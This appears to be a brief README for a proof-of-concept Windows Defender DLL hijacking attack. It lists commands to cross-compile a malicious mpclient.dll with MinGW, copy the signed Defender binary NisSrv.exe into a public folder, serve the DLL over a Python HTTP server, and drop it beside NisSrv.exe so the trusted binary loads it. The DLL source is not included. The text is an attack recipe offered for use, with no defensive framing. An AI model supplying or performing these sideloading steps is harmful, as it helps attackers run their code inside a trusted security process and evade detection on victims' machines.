# Windows-Defender-DLL-Hijacking

## Linux Compilation

Commands:

sudo apt-get update && sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 wine64

x86_64-w64-mingw32-g++ --shared -o mpclient.dll mpclient.cpp

## Attack

copy "%ProgramFiles%\Windows Defender\NisSrv.exe" "C:\Users\Public\DLL Hijacking"

python3 -m http.server 80

Download Dll in folder with Nissrv

## Special thanks

Los3rPWN for Proof of Concept
